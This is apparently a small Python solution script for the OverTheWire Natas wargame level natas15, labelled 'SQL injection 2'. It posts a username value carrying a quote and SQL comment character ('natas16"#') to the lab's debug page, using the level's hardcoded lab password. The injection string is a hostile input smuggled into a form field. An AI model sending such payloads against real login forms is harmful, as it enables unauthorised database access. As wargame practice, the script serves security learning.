#!/usr/bin/env python
# SQL INJECTION 2


# import the package requests which is for html information
import requests
import re


username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

# blank temp response = requests.get(url,auth = (username, password))

session = requests.Session()
# response = requests.get(url,auth = (username, password))
response = session.post(url,data = {"username" : 'natas16"#' } ,auth = (username, password))

content = response.text
# (.*)
print(content)

 #print(re.findall("The password for natas15 is (.*)<br><div", content)[0])

